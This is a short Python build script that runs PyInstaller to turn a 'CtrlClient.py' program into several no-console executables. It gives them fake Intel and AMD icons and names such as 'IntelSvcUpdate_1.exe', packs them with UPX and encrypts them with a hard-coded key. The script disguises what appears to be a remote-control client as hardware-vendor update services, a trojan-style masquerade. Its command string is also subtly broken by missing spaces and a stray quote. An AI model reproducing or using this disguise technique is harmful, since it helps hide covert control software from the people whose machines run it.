import os






data = {
    1: {'client_id': '1', 'icon': "fake_Intel.ico", 'name': 'IntelSvcUpdate_1.exe'},
    2: {'client_id': '2', 'icon': "fake_AMD.ico", 'name': 'AMDRSSvc_2.exe'},
    3: {'client_id': '3', 'icon': "fake_Intel.ico", 'name': 'IntelSvcUpdate_3.exe'},
    4: {'client_id': '4', 'icon': "fake_Intel.ico", 'name': 'IntelSvcUpdate_4.exe'},
}

work_dir = os.getcwd()



# os.system(f"pyinstaller -F -w -i C:\Users\steve3ussr\Desktop\icons8-update-80.ico --upx-dir=C:\ProgramLocalLow\upx-4.0.2-win64\upx.exe --key sUMdGrYZ3aDssGyp C:\File\Repository\PyCharmProject\SelfDefinedScripts\CtrlClient.py")

for k, v in data.items():
    os.system(f"pyinstaller --onefile --noconsole --clean"
              f"-i {work_dir}\\{v['icon']} "
              f"--upx-dir=C:\\Program Low Files\\upx-4.0.2-win64 "
              f"--key sUMdGrYZ3aDssGyp "
              f"--name {v['name']} "
              f"{work_dir}\\'CtrlClient.py")
